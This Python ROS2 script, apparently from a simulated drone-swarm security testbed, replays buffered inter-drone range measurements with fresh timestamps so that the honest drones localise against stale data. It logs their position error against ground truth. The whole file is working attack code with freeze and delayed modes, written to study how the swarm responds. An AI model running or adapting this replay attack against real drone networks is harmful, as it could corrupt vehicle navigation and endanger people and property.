#!/usr/bin/env python3
"""
Replay attack on cooperative localisation range topics
=======================================================
Captures live range measurements from inter_drone_ranging.py,
buffers them, then re-injects stale ones with fresh timestamps.
Honest drones localise against a frozen swarm configuration.

Run:
    ros2 run swarm_discovery replay_attack
    ros2 run swarm_discovery replay_attack freeze    # worst case
    ros2 run swarm_discovery replay_attack delayed   # rolling 5s lag

STRIDE: Spoofing, Denial of Service
"""
import sys, csv, time, collections
import numpy as np
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import PoseStamped, PointStamped

EVIL_DRONE    = "px4_2"
HONEST_DRONES = ["px4_1", "px4_3", "px4_4"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]
REPLAY_MODE   = "delayed"
DELAY_SEC     = 5.0
BUFFER_SEC    = 15.0
WARMUP_SEC    = 10.0
PUBLISH_HZ    = 25.0
ATTACK_SEC    = 90.0
LOG_FILE      = "/tmp/replay_attack_metrics.csv"


class ReplayAttack(Node):
    def __init__(self, mode):
        super().__init__("replay_attack")
        self.mode       = mode
        self.start_time = time.monotonic()
        self._buffer    = {}
        self.est        = {d: None for d in HONEST_DRONES}
        self.gt         = {d: None for d in ALL_DRONES}

        pairs = [(o, d) for o in ALL_DRONES for d in ALL_DRONES if o != d]
        for pair in pairs:
            self._buffer[pair] = collections.deque()

        # Subscribe to all range topics to capture them
        for observer in ALL_DRONES:
            for observed in ALL_DRONES:
                if observer == observed:
                    continue
                self.create_subscription(
                    PointStamped,
                    f"/{observer}/coop/range_to/{observed}",
                    lambda msg, o=observer, d=observed: self._on_range(o, d, msg),
                    10)

        # Subscribe to ground truth and estimates
        for drone in ALL_DRONES:
            self.create_subscription(PoseStamped,
                f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(PoseStamped,
                f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)

        # Replay publishers — inject stale ranges on evil drone's outbound topics
        self._replay_pubs = {}
        for observed in HONEST_DRONES:
            topic = f"/{EVIL_DRONE}/coop/range_to/{observed}"
            self._replay_pubs[(EVIL_DRONE, observed)] = self.create_publisher(
                PointStamped, topic, 10)

        # CSV
        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow([
            "t_s", "phase", "mode", "msg_age_s",
            "px4_1_est_x", "px4_1_est_y", "px4_1_est_z",
            "px4_1_gt_x",  "px4_1_gt_y",  "px4_1_gt_z", "px4_1_error_m",
            "px4_3_est_x", "px4_3_est_y", "px4_3_est_z",
            "px4_3_gt_x",  "px4_3_gt_y",  "px4_3_gt_z", "px4_3_error_m",
        ])

        self.create_timer(1.0 / PUBLISH_HZ, self._tick)
        self.get_logger().warn(
            f"[REPLAY] mode={mode} delay={DELAY_SEC}s warmup={WARMUP_SEC}s")

    def _on_range(self, observer, observed, msg):
        buf = self._buffer[(observer, observed)]
        buf.append((time.monotonic(), msg))
        cutoff = time.monotonic() - BUFFER_SEC
        while buf and buf[0][0] < cutoff:
            buf.popleft()

    def _tick(self):
        elapsed = time.monotonic() - self.start_time
        now     = time.monotonic()
        phase   = "warmup" if elapsed < WARMUP_SEC else "attack"
        msg_age = 0.0

        if elapsed > ATTACK_SEC:
            self.get_logger().info("[REPLAY] Complete.")
            self._csv_file.flush(); self._csv_file.close()
            self.destroy_node(); return

        if phase == "attack":
            for observed in HONEST_DRONES:
                buf   = self._buffer[(EVIL_DRONE, observed)]
                stale = self._pick_stale(buf, now)
                if stale is None:
                    continue
                wall_t, msg = stale
                msg_age = now - wall_t
                replay = PointStamped()
                replay.header.stamp    = self.get_clock().now().to_msg()
                replay.header.frame_id = "world"
                replay.point.x = msg.point.x
                replay.point.y = msg.point.y
                replay.point.z = msg.point.z
                self._replay_pubs[(EVIL_DRONE, observed)].publish(replay)

        # Log
        row = [f"{elapsed:.3f}", phase, self.mode, f"{msg_age:.3f}"]
        for drone in HONEST_DRONES:
            est, gt = self.est.get(drone), self.gt.get(drone)
            if est is not None and gt is not None:
                err = float(np.linalg.norm(est - gt))
                row += [f"{est[0]:.4f}", f"{est[1]:.4f}", f"{est[2]:.4f}",
                        f"{gt[0]:.4f}",  f"{gt[1]:.4f}",  f"{gt[2]:.4f}", f"{err:.4f}"]
            else:
                row += [""] * 7
        self._csv.writerow(row)

        if int(elapsed) % 10 == 0 and int(elapsed * PUBLISH_HZ) % int(PUBLISH_HZ) == 0:
            self.get_logger().warn(
                f"[REPLAY t={elapsed:.0f}s phase={phase}] age={msg_age:.2f}s | " +
                " | ".join(f"{d} err={np.linalg.norm(self.est[d]-self.gt[d]):.3f}m"
                           for d in HONEST_DRONES
                           if self.est.get(d) is not None and self.gt.get(d) is not None))

    def _pick_stale(self, buf, now):
        if not buf:
            return None
        if self.mode == "freeze":
            return buf[0]
        target = now - DELAY_SEC
        candidate = None
        for entry in buf:
            if entry[0] <= target:
                candidate = entry
            else:
                break
        return candidate


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else REPLAY_MODE
    rclpy.init()
    node = ReplayAttack(mode)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()

if __name__ == "__main__":
    main()
